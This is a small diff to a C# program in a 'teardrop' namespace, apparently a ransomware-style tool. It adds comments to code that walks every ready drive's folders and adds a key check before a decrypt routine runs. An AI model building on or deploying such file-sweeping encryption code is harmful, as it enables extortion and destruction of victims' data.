@@ -521,6 +521,7 @@ namespace teardrop
                             //  if the drive is ready try to get all the files and files in subfolders using ShowAllFoldersUnder()
                             if (drive.IsReady)
                             {
+                                // Get all sub folders etc
                                 ShowAllFoldersUnder(drive.Name, 0);
                             }
                             else
@@ -584,9 +585,14 @@ namespace teardrop
             e.Cancel = true;
         }
 
+        // Here we try to decrypt the files
         private void button1_Click(object sender, EventArgs e)
         {
-            GetFiles("decrypt");
+            // Small check if a key is actually set
+            if(textBox3.Text.Length >= 0 && string.IsNullOrEmpty(textBox3.Text) == false)
+            {
+                GetFiles("decrypt");
+            }
         }
     }
 }
